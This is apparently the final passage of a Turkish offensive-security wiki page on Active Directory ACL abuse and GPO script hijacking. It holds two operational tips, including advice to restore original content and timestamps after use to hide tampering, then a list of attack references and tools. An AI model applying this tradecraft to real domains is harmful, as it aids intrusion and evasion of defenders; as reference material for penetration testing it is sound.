- Çalıştırma, logging yapan kullanıcının token'ı altında gerçekleşir (SYSTEM değil). Kapsam, bu script'i uygulayan GPO link'idir (OU, site, domain).
- Kullanımdan sonra özgün içeriği/zaman damgalarını geri yükleyerek temizleyin.


## References

- [1] [Active Directory ACL'lerini/ACE'lerini Abuse Etme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path Güncellemesi](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory'de ACL'lerle Ayrıcalıkları Yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Ayrıcalıkları ve Ayrıcalıklı Hesapları Tarama](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux'tan AD attribute/UAC operasyonları](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking ve DC admin'e DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution ve NTLM Relay için GPO UNC Path'lerini Hijack Etme](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: Active Directory GPO'larını NTLM relaying ve daha fazlası üzerinden exploit etme](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory'deki gizli Organizational Units ACL attack vector'larını exploit etme](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Ağ üzerinde meşru Active Directory servislerini simüle etme: GPO exploitation vakası](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
